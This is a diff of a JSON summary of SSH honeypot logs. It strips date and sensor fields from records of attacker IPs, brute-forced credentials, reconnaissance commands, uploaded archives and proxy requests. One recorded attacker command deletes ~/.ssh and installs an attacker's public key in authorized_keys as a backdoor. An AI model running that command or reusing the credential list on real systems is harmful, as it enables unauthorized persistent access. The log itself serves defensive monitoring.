-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "58.221.101.182",
-      "count": 1,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "125.77.23.30",
-      "count": 1,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4828,25 +3642,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 4616,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 4616
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1932,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1932
     },
     {
       "src_ip": "5.188.86.210",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1025,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1025
     }
   ]
 },
@@ -4857,109 +3665,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18451,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18451
     },
     {
       "username": "root",
       "password": "beatriz",
-      "count": 197,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 197
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 126,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 126
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 138,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 138
     },
     {
       "input": "lscpu | grep Model",
-      "count": 129,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 129
     },
     {
       "input": "uname",
-      "count": 129,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 129
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 128,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 128
     },
     {
       "input": "cat /etc/issue",
-      "count": 16,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 16
     },
     {
       "input": "echo Hi | cat -n",
-      "count": 5,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1193,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1193
     },
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1130,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1130
     },
     {
       "src_ip": "5.188.86.221",
       "dst_port": 2222,
-      "count": 1033,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1033
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 1002,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1002
     },
     {
       "src_ip": "5.188.86.165",
       "robot": true,
-      "count": 856,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 856
     },
     {
       "src_ip": "5.188.87.53",
       "robot": true,
-      "count": 836,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 836
     }
   ],
   "file_download": [
@@ -4970,18 +3748,14 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota3.tar.gz",
       "src_ip": "121.241.244.92",
-      "count": 1,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4989,25 +3763,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 1905,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1905
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 1082,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1082
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 1067,
-      "date": "2021-05-07",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1067
     }
   ]
 }
